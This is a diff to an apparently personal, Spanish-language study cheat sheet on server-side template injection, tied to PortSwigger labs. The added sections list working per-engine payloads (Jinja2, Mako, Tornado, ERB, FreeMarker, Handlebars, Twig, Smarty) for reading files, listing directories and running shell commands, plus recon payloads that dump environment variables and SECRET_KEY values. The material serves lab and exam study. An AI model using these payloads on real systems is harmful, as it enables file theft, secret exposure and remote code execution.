@@ -1,7 +1,11 @@
-# FreeMarkerServer-Side Template Injection (SSTI)
+# SSTI — Cheatsheet de motores
+
+> 🗺️ **Esto es la hoja de consulta** (sintaxis + payloads por lenguaje). Para el **cómo/cuándo general** (detectar → identificar → explotar) andá al entry point: [[vulnerabilities/009-server-side-template-injection/server-side-template-injection|entry point]].
 
 Referencia completa de motores/librerías de templates por lenguaje, con la sintaxis
 básica que sirve para **identificar y explotar SSTI**.
+
+> **Labs de PortSwigger** (7, con motor · lenguaje · payload que funcionó) → [[vulnerabilities/009-server-side-template-injection/labs/README|labs/README]].
 
 > **SSTI** ocurre cuando la entrada del usuario se concatena dentro de una plantilla
 > en lugar de pasarse como dato, permitiendo evaluar expresiones del motor y, en muchos
@@ -256,6 +260,100 @@ settings[view options][outputFunctionName]=x;process.mainModule.require('child_p
 > necesitás `exec(new String[]{"cmd","/c","dir"})` porque `exec("ls")` no pasa por shell.
 > Go, C# y Rust no aparecen con columna `ls` porque sus motores top son sandbox o
 > solo permiten fugas de info (no ejecución de comandos).
+
+---
+
+## 📖 Leer archivos y listar directorios (sin depender del shell)
+
+> En **Stage 3** el objetivo suele ser **leer** `/home/carlos/secret`, no ejecutar un comando. Casi todos los motores tienen **API nativa de archivos** → más limpio que `system`/`popen` y **funciona aunque el shell esté filtrado o sandboxeado**.
+
+### Python — Jinja2
+```jinja2
+{# leer #}
+{{ cycler.__init__.__globals__.__builtins__.open('/home/carlos/secret').read() }}
+{# listar #}
+{{ cycler.__init__.__globals__.__builtins__.__import__('os').listdir('/home/carlos') }}
+```
+
+### Python — Mako
+```mako
+## leer
+${ open('/home/carlos/secret').read() }
+## listar
+<% import os %>${ os.listdir('/home/carlos') }
+```
+
+### Python — Tornado
+```
+{# leer (open del builtins) #}
+{{ __import__('builtins').open('/home/carlos/secret').read() }}
+{# listar #}
+{{ __import__('os').listdir('/home/carlos') }}
+{# variante shell #}
+{{ __import__('os').popen('ls').read() }}
+```
+
+### Ruby — ERB
+```erb
+<%# leer %>
+<%= File.read('/home/carlos/secret') %>
+<%= File.open('/example/arbitrary-file').read %>
+<%# listar %>
+<%= Dir.entries('/') %>
+<%# shell (backticks) %>
+<%= `cat /home/carlos/secret` %>
+```
+
+### Java — FreeMarker
+```freemarker
+<#-- shell vía Execute --#>
+<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("cat /home/carlos/secret") }
+<#-- leer SIN Execute (útil en sandbox): reflection sobre un objeto disponible --#>
+${ product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/secret').toURL().openStream().readAllBytes()?join(" ") }
+```
+> El `?join(" ")` devuelve los **bytes en decimal** → decodificalos a texto.
+
+### Node — Handlebars
+> En el mismo chain del exploit (ver [[vulnerabilities/009-server-side-template-injection/labs/README|lab 4]]), cambiás `child_process` por `fs`:
+```
+{{this.push "return require('fs').readFileSync('/home/carlos/secret').toString();"}}   ← leer
+{{this.push "return require('fs').readdirSync('/home/carlos').toString();"}}            ← listar
+```
+
+### PHP — Twig / Smarty (bonus: no están en el examen, pero salvan)
+```twig
+{# Twig: source() devuelve el contenido crudo de un archivo #}
+{{ source('/home/carlos/secret') }}
+```
+```smarty
+{* Smarty: fetch lee un archivo *}
+{fetch file='/home/carlos/secret'}
+```
+
+### Django
+- **No** hay API de archivos en el template (sandbox estricto). Acá el camino no es leer un archivo sino **fuga de info**: `{% debug %}` para enumerar → `{{ settings.SECRET_KEY }}`.
+
+---
+
+## 🔎 Recon del entorno (variables, config, secretos)
+
+> Antes de ir por RCE, mirá qué **objetos/variables** ya tenés a mano — a veces alcanzan (SECRET_KEY, credenciales, rutas).
+
+- **Java / Spring EL** — variables de entorno del proceso:
+  ```
+  ${T(java.lang.System).getenv()}
+  ${T(java.lang.System).getProperty("user.dir")}
+  ```
+- **Django (Python)** — enumerar el contexto y leer settings:
+  ```
+  {% debug %}
+  {{ settings.SECRET_KEY }}
+  ```
+- **Jinja2 (Python)** — config de Flask (suele traer la SECRET_KEY):
+  ```
+  {{ config }}
+  {{ config.items() }}
+  ```
 
 ---
 
